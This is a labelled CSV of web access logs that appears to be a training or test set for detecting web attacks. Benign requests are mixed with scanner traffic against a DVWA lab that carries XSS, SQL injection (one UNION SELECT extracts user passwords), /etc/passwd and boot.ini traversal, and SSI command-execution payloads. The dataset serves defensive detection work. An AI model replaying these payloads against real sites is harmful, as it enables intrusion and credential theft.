Remote_host,Identd,REMOTE_USER,Date_time,Method,Path,Version,Status,Length,Label
172.17.0.1,-,-,12/Feb/2019:08:55:18 +0000,GET,/login.php,HTTP/1.1,200,1845,0.0
172.17.0.1,-,-,12/Feb/2019:08:08:29 +0000,GET,/src/read_body.php?mailbox=%3Cscript%3Ealert(Vulnerable)%3C%2Fscript%3E&passed_id=%3Cscript%3Ealert(Vulnerable)%3C%2Fscript%3E&startMessage=1&show_more=0,HTTP/1.1,404,507,1.0
172.17.0.1,-,-,12/Feb/2019:08:21:38 +0000,GET,/?user_token=%3CIMG+SRC%3Djavascript%3Aalert%28String.fromCharCode%2888%2C83%2C83%29%29%3E,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:55:10 +0000,GET,/dvwa/?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F,HTTP/1.1,200,1674,3.0
172.17.0.1,-,-,12/Feb/2019:08:08:29 +0000,GET,/dcforum/dcforum.cgi?az=list&forum=../../../../../../../../../../etc/passwd%00,HTTP/1.1,404,510,3.0
172.17.0.1,-,-,12/Feb/2019:08:21:25 +0000,GET,/?username=%22OR+%221%22%3D%221,HTTP/1.1,302,300,2.0
172.17.0.1,-,-,12/Feb/2019:08:21:44 +0000,GET,/?Login=%3COBJECT+classid%3Dclsid%3Aae24fdae-03c6-11d1-8b76-0080c744f389%3E%3Cparam+name%3Durl+value%3Djavascript%3Aalert%28%27XSS%27%29%3E%3C%2FOBJECT%3E,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:08:29 +0000,GET,/sysuser/docmgr/create.stm?path=<script>alert(document.cookie)</script>,HTTP/1.1,404,516,1.0
172.17.0.1,-,-,12/Feb/2019:08:08:25 +0000,GET,/qIjBrQVG.htaccess~,HTTP/1.1,404,509,3.0
172.17.0.1,-,-,12/Feb/2019:08:55:16 +0000,GET,/setup.php,HTTP/1.1,200,4428,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:16 +0000,GET,/login.php,HTTP/1.1,200,1795,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:46 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:13 +0000,GET,/login.php,HTTP/1.1,200,1845,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:59 +0000,GET,/?username=%3CIMG+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%22&user_token=%3CIMG+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%22&Login=%3CIMG+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%22&password=%3CIMG+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%22&,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:21:44 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:17 +0000,GET,/dvwa/css?query=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C,HTTP/1.1,301,659,2.0
172.17.0.1,-,-,12/Feb/2019:08:21:25 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:53 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:29 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:13 +0000,GET,/setup.php,HTTP/1.1,200,4447,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:10 +0000,GET,/dvwa/images/?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini,HTTP/1.1,200,2341,3.0
172.17.0.1,-,-,12/Feb/2019:08:21:50 +0000,GET,/?password=%3CBASE+HREF%3D%22javascript%3Aalert%28%27XSS%27%29%3B%2F%2F%22%3E,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:21:31 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
89.105.140.247,-,-,13/Dec/2015:05:15:12 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:40 +0000,GET,/about.php/,HTTP/1.1,200,13012,0.0
haraway.ucet.ufl.edu,-,-,01/Aug/1995:00:02:05 -0400,GET,/images/rss.gif,HTTP/1.0,200,283389,0.0
172.17.0.1,-,-,12/Feb/2019:08:08:29 +0000,GET,/viewimg.php?path=../../../../../../../../../../etc/passwd&form=1&var=1,HTTP/1.1,404,502,3.0
172.17.0.1,-,-,12/Feb/2019:08:08:25 +0000,GET,/qIjBrQVG.config~,HTTP/1.1,404,507,3.0
172.17.0.1,-,-,12/Feb/2019:08:21:38 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:22:03 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:27 +0000,GET,/dvwa/images/login_logo.png?query=query+AND+1%3D2+--+,HTTP/1.1,200,9319,2.0
172.17.0.1,-,-,12/Feb/2019:08:21:40 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:55 +0000,GET,/?password=%3CDIV+STYLE%3D%22background-image%3A+url%28javascript%3Aalert%28%27XSS%27%29%29%22%3E,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:08:26 +0000,GET,/dev/translations.php?ONLY=%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00,HTTP/1.1,404,511,3.0
172.17.0.1,-,-,12/Feb/2019:08:22:00 +0000,GET,/?username=%3COBJECT+classid%3Dclsid%3Aae24fdae-03c6-11d1-8b76-0080c744f389%3E%3Cparam+name%3Durl+value%3Djavascript%3Aalert%28%27XSS%27%29%3E%3C%2FOBJECT%3E&user_token=%3COBJECT+classid%3Dclsid%3Aae24fdae-03c6-11d1-8b76-0080c744f389%3E%3Cparam+name%3Durl+value%3Djavascript%3Aalert%28%27XSS%27%29%3E%3C%2FOBJECT%3E&Login=%3COBJECT+classid%3Dclsid%3Aae24fdae-03c6-11d1-8b76-0080c744f389%3E%3Cparam+name%3Durl+value%3Djavascript%3Aalert%28%27XSS%27%29%3E%3C%2FOBJECT%3E&password=%3COBJECT+classid%3Dclsid%3Aae24fdae-03c6-11d1-8b76-0080c744f389%3E%3Cparam+name%3Durl+value%3Djavascript%3Aalert%28%27XSS%27%29%3E%3C%2FOBJECT%3E&,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:21:49 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:18 +0000,POST,/setup.php?query=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C,HTTP/1.1,302,281,2.0
172.17.0.1,-,-,12/Feb/2019:08:21:44 +0000,GET,/?Login=%3CIMG+SRC%3Djavascript%3Aalert%28%27XSS%27%29%3E,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:21:44 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
129.193.116.41,-,-,01/Jul/1995:00:17:46 -0400,GET,/shuttle/countdown/,HTTP/1.0,200,3985,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:18 +0000,GET,/robots.txt?query=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C,HTTP/1.1,200,254,2.0
172.17.0.1,-,-,12/Feb/2019:08:55:21 +0000,POST,/login.php?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E,HTTP/1.1,302,281,1.0
172.17.0.1,-,-,12/Feb/2019:08:55:55 +0000,GET,/login.php,HTTP/1.1,200,1845,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:18 +0000,GET,/login.php?query=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C,HTTP/1.1,200,1845,2.0
172.17.0.1,-,-,12/Feb/2019:08:55:09 +0000,GET,/login.php,HTTP/1.1,200,1795,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:53 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:08:27 +0000,GET,/edittag/edittag.cgi?file=%2F..%2F..%2F..%2F..%2F..%2Fetc/passwd,HTTP/1.1,404,510,3.0
172.17.0.1,-,-,12/Feb/2019:08:21:45 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:29 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
109.184.11.34,-,-,13/Dec/2015:14:23:17 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:31 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:12 +0000,GET,/login.php,HTTP/1.1,200,1795,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:35 +0000,GET,/?user_token=%3CMETA+HTTP-EQUIV%3D%22refresh%22+CONTENT%3D%220%3Burl%3Djavascript%3Aalert%28%27XSS%27%29%3B%22%3E,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:55:09 +0000,GET,/login.php,HTTP/1.1,200,1795,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:25 +0000,GET,/?password=%27%3B--,HTTP/1.1,302,300,2.0
172.17.0.1,-,-,12/Feb/2019:08:22:03 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:45 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:16 +0000,GET,/login.php,HTTP/1.1,200,1845,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:29 +0000,GET,/?username=a%3D%22get%22%3B%26%2310%3Bb%3D%22URL%28%22%22%3B%26%2310%3Bc%3D%22javascript%3A%22%3B%26%2310%3Bd%3D%22alert%28%27XSS%27%29%3B%22%29%22%3B+eval%28a%2Bb%2Bc%2Bd%29%3B,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:08:27 +0000,GET,/replymsg.php?send=1&destin=<script>alert('Vulnerable')</script>,HTTP/1.1,404,503,1.0
172.17.0.1,-,-,12/Feb/2019:08:08:28 +0000,GET,/modif_infos.asp?n=/../../../../../../../../../etc/passwd,HTTP/1.1,404,506,3.0
172.17.0.1,-,-,12/Feb/2019:08:21:25 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:29 +0000,GET,/instructions.php?query=query%27+AND+%271%27%3D%272%27+--+,HTTP/1.1,200,14305,2.0
172.17.0.1,-,-,12/Feb/2019:08:21:27 +0000,GET,/?username=%3CIMG+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%22,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:55:21 +0000,GET,/login.php,HTTP/1.1,200,1845,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:45 +0000,GET,/?Login=%27%27%3B%21--%22%3CXSS%3E%3D%26%7B%28%29%7D,HTTP/1.1,302,300,2.0
172.17.0.1,-,-,12/Feb/2019:08:55:21 +0000,GET,/setup.php,HTTP/1.1,200,4347,0.0
172.17.0.1,-,-,12/Feb/2019:08:08:27 +0000,GET,"/index.php?file=Liens&op=\\\""><script>alert('Vulnerable');</script>",HTTP/1.1,302,479,1.0
172.17.0.1,-,-,12/Feb/2019:08:21:32 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:25 +0000,GET,/?username=1%27+OR+1+OR+1%3D%27,HTTP/1.1,302,300,2.0
172.17.0.1,-,-,12/Feb/2019:08:22:00 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:12 +0000,GET,/login.php,HTTP/1.1,200,1845,0.0
37.146.123.167,-,-,13/Dec/2015:07:21:51 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
178.34.161.222,-,-,12/Dec/2015:19:43:31 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:25 +0000,GET,/docs?query=query+UNION+ALL+select+NULL+--+,HTTP/1.1,301,596,2.0
172.17.0.1,-,-,12/Feb/2019:08:21:55 +0000,GET,/?password=%3CSTYLE%3E.XSS%7Bbackground-image%3Aurl%28%22javascript%3Aalert%28%27XSS%27%29%22%29%3B%7D%3C%2FSTYLE%3E%3CA+CLASS%3DXSS%3E%3C%2FA%3E,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:55:19 +0000,GET,/docs/DVWA_v1.3.pdf?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E,HTTP/1.1,200,422251,1.0
172.17.0.1,-,-,12/Feb/2019:08:21:51 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
178.44.113.180,-,-,13/Dec/2015:12:27:48 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:50 +0000,GET,/setup.php,HTTP/1.1,200,4428,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:55 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:16 +0000,GET,/setup.php,HTTP/1.1,200,4428,0.0
172.17.0.1,-,-,12/Feb/2019:08:08:27 +0000,GET,"/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/*",HTTP/1.1,302,478,2.0
172.17.0.1,-,-,12/Feb/2019:08:21:28 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
129.188.154.200,-,-,01/Jul/1995:00:16:51 -0400,GET,/htbin/wais.pl,HTTP/1.0,200,308,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:12 +0000,GET,/login.php,HTTP/1.1,200,1845,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:36 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:42 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:42 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:28 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:46 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:53 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
unicomp6.unicomp.net,-,-,01/Jul/1995:00:04:16 -0400,GET,/ksc.html,HTTP/1.0,200,7074,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:39 +0000,GET,/?user_token=%3CTABLE%3E%3CTD+BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E%3C%2FTD%3E%3C%2FTABLE%3E,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:21:52 +0000,GET,/?password=%3CBODY+BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E,HTTP/1.1,302,300,1.0
85.174.39.161,-,-,12/Dec/2015:22:38:43 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:28 +0000,GET,/dvwa/js/dvwaPage.js?query=query%27%29+UNION+ALL+select+NULL+--+,HTTP/1.1,200,1296,2.0
172.17.0.1,-,-,12/Feb/2019:08:21:55 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:12 +0000,GET,/login.php,HTTP/1.1,200,1845,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:44 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:08:27 +0000,GET,/modules.php?name=Classifieds&op=ViewAds&id_subcatg=75&id_catg=<script>alert('Vulnerable')</script>,HTTP/1.1,404,502,1.0
46.44.5.179,-,-,13/Dec/2015:04:10:24 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:25 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:27 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:51 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:52 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:25 +0000,GET,/?user_token=1%27+OR+1+OR+1%3D%27,HTTP/1.1,302,300,2.0
172.17.0.1,-,-,12/Feb/2019:08:55:53 +0000,GET,/docs/?query=%2B,HTTP/1.1,200,1308,0.0
172.17.0.1,-,-,12/Feb/2019:08:08:27 +0000,GET,/modules.php?name=Downloads&d_op=viewdownloaddetails&lid=02&ttitle=<script>alert('Vulnerable')</script>,HTTP/1.1,404,502,1.0
172.17.0.1,-,-,12/Feb/2019:08:21:52 +0000,GET,/?password=%3CIMG+SRC%3Djavascript%3Aalert%28%27XSS%27%29%3E,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:21:39 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:28 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:25 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:26 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:54 +0000,GET,/dvwa/js/,HTTP/1.1,200,1347,0.0
178.88.155.223,-,-,12/Dec/2015:23:47:21 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:36 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:15 +0000,GET,/login.php,HTTP/1.1,200,1845,0.0
temprano.netheaven.com,-,-,01/Jul/1995:00:14:17 -0400,GET,/shuttle/countdown/,HTTP/1.0,200,3985,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:25 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:54 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:25 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:29 +0000,GET,/instructions.php,HTTP/1.1,200,14305,0.0
172.17.0.1,-,-,12/Feb/2019:08:22:02 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:31 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:22:00 +0000,GET,/?username=%3CIMG+SRC%3Djavascript%3Aalert%28%27XSS%27%29%3E&user_token=%3CIMG+SRC%3Djavascript%3Aalert%28%27XSS%27%29%3E&Login=%3CIMG+SRC%3Djavascript%3Aalert%28%27XSS%27%29%3E&password=%3CIMG+SRC%3Djavascript%3Aalert%28%27XSS%27%29%3E&,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:55:26 +0000,GET,/dvwa/css/login.css?query=query+AND+1%3D2+--+,HTTP/1.1,200,1093,2.0
172.17.0.1,-,-,12/Feb/2019:08:21:34 +0000,GET,/?user_token=%3CFRAMESET%3E%3CFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FFRAMESET%3E,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:21:34 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:30 +0000,GET,/?username=%3CIMG+SRC%3D%60javascript%3Aalert%28%22RSnake+says%2C+%27XSS%27%22%29%60%3E,HTTP/1.1,302,300,1.0
195.8.51.14,-,-,13/Dec/2015:14:28:15 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:28 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:32 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:27 +0000,GET,/dvwa/images/login_logo.png?query=query%27+AND+%271%27%3D%271%27+--+,HTTP/1.1,200,9319,2.0
172.17.0.1,-,-,12/Feb/2019:08:55:16 +0000,GET,/setup.php,HTTP/1.1,200,4428,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:25 +0000,GET,/?query=query%27+AND+%271%27%3D%271%27+--+,HTTP/1.1,302,281,2.0
172.17.0.1,-,-,12/Feb/2019:08:21:48 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:51 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:44 +0000,GET,/?Login=%3CINPUT+TYPE%3D%22IMAGE%22+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:21:57 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:57 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:31 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:13 +0000,GET,/sitemap.xml?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini,HTTP/1.1,404,447,3.0
172.17.0.1,-,-,12/Feb/2019:08:08:27 +0000,GET,/article.cfm?id=1'<script>alert(document.cookie);</script>,HTTP/1.1,404,503,1.0
172.17.0.1,-,-,12/Feb/2019:08:21:43 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:40 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:55 +0000,GET,/login.php,HTTP/1.1,200,1845,0.0
172.17.0.1,-,-,12/Feb/2019:08:22:02 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:28 +0000,GET,/?username=%3CINPUT+TYPE%3D%22IMAGE%22+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:55:30 +0000,POST,/login.php?query=query%27+AND+%271%27%3D%272%27+--+,HTTP/1.1,302,281,2.0
172.17.0.1,-,-,12/Feb/2019:08:55:19 +0000,GET,/dvwa/css/?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E,HTTP/1.1,200,1703,1.0
172.17.0.1,-,-,12/Feb/2019:08:21:27 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:39 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:08:27 +0000,GET,/.../.../.../.../.../.../.../.../.../.../etc/passwd,HTTP/1.1,404,541,3.0
172.17.0.1,-,-,12/Feb/2019:08:21:31 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:56 +0000,GET,/?password=%3CSTYLE+type%3D%22text%2Fcss%22%3EBODY%7Bbackground%3Aurl%28%22javascript%3Aalert%28%27XSS%27%29%22%29%7D%3C%2FSTYLE%3E,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:55:55 +0000,GET,/login.php,HTTP/1.1,200,1845,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:28 +0000,GET,/dvwa/images/spanner.png?query=query+AND+1%3D2+--+,HTTP/1.1,200,693,2.0
slip-5.io.com,-,-,01/Jul/1995:00:18:15 -0400,GET,/icons/blank.xbm,HTTP/1.0,200,509,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:44 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:25 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:55 +0000,GET,/login.php,HTTP/1.1,200,1845,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:17 +0000,GET,/dvwa/images/logo.png?query=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E,HTTP/1.1,200,5275,2.0
189.12.158.85,-,-,13/Dec/2015:06:44:00 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:29 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:29 +0000,GET,/instructions.php?query=query+AND+1%3D1+--+,HTTP/1.1,200,14305,2.0
172.17.0.1,-,-,12/Feb/2019:08:21:43 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:08:27 +0000,GET,/modules.php?letter=%22%3E%3Cimg%20src=javascript:alert(document.cookie);%3E&op=modload&name=Members_List&file=index,HTTP/1.1,404,502,1.0
172.17.0.1,-,-,12/Feb/2019:08:21:33 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:12 +0000,GET,/login.php,HTTP/1.1,200,1845,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:31 +0000,GET,/setup.php?query=query%27%29+UNION+ALL+select+NULL+--+,HTTP/1.1,200,4347,2.0
172.17.0.1,-,-,12/Feb/2019:08:21:26 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:08:27 +0000,GET,/jsp/jspsamp/jspexamples/viewsource.jsp?source=/../../../../../../../../../boot.ini,HTTP/1.1,404,529,3.0
172.17.0.1,-,-,12/Feb/2019:08:21:44 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:08:29 +0000,GET,/boilerplate.asp?NFuse_Template=.../.../.../.../.../.../.../.../.../boot.ini&NFuse_CurrentFolder=/,HTTP/1.1,404,506,3.0
172.17.0.1,-,-,12/Feb/2019:08:21:25 +0000,GET,/?user_token=%27%3B--,HTTP/1.1,302,300,2.0
172.17.0.1,-,-,12/Feb/2019:08:55:15 +0000,GET,/login.php,HTTP/1.1,200,1845,0.0
95.139.27.245,-,-,13/Dec/2015:13:32:24 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:55 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
